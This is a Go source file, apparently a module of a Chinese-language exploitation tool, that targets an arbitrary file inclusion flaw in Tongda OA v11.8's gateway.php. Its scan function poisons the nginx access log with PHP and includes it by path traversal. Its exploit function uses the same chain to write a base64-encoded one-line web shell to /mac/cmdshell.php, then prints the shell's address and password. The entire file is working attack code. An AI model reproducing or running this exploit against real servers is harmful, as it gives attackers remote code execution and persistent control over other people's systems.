package vulners

import (
	"strings"

	"github.com/fatih/color"
)

type Td09 struct {
}

func (c *Td09) Scan(targetUrl string) {
	vulnerable, err := Td09scancore(targetUrl)
	if err != nil {
		color.Red("[X]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Td09] 存在v11.8 gateway.php 任意文件包含（EXP可RCE）")
	} else {
		color.White("[Td09] 不存在v11.8 gateway.php 任意文件包含（EXP可RCE）")
	}
}

func (*Td09) Exploit(targetUrl string) {
	runResult, err := Td09runcore(targetUrl)
	if err != nil {
		color.Red("[X]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Td09scancore(targetUrl string) (bool, error) {
	url := "/d1a4278d?json={}&aa=<?php @fputs(fopen(base64_decode('dGVzdDY2Ni5waHA='),w),base64_decode('PD9waHAgZWNobyAxMjMzMjExMjM0NTY3Oz8+'));?>"
	var resp, err = baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	if resp.StatusCode != 200 {
		url2 := "/ispirit/interface/gateway.php"
		data1 := `json={"url":"/general/../../nginx/logs/oa.access.log"}`
		resp2, err := baseClient.
			NewRequest().
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			SetBody(data1).
			Post(targetUrl + url2)
		if err != nil {
			return false, err
		}
		resContent2 := resp2.String()
		if strings.Contains(resContent2, "/d1a4278d?json={}&aa=") {
			url3 := "/mac/test666.php"
			resp3, err := baseClient.
				NewRequest().
				SetHeader("Content-Type", "application/x-www-form-urlencoded").
				Get(targetUrl + url3)
			if err != nil {
				return false, err
			}
			resContent3 := resp3.String()
			if resp3.StatusCode == 200 && strings.Contains(resContent3, "1233211234567") {
				return true, err
			} else {
				return false, err
			}
		} else {
			return false, nil
		}
	} else {
		return false, nil
	}

}

func Td09runcore(targetUrl string) (string, error) {
	url := "/d1a4278d?json={}&aa=<?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='));?>"
	var resp, err = baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != 200 {
		url2 := "/ispirit/interface/gateway.php"
		data1 := `json={"url":"/general/../../nginx/logs/oa.access.log"}`
		resp2, err := baseClient.
			NewRequest().
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			SetBody(data1).
			Post(targetUrl + url2)
		if err != nil {
			return "", err
		}
		resContent2 := resp2.String()
		if strings.Contains(resContent2, "/d1a4278d?json={}&aa=") {
			url3 := "/mac/cmdshell.php"
			resp3, err := baseClient.
				NewRequest().
				SetHeader("Content-Type", "application/x-www-form-urlencoded").
				Get(targetUrl + url3)
			if err != nil {
				return "", err
			}
			if resp3.StatusCode == 200 {
				return "[Td09] 存在v11.8 gateway.php 任意文件包含RCE\n已上传一句话WebShell\nWebShell地址：\n/mac/cmdshell.php\n连接密码：\ncmdshell", err
			} else {
				return "", err
			}
		} else {
			return "", nil
		}
	} else {
		return "", nil
	}

}
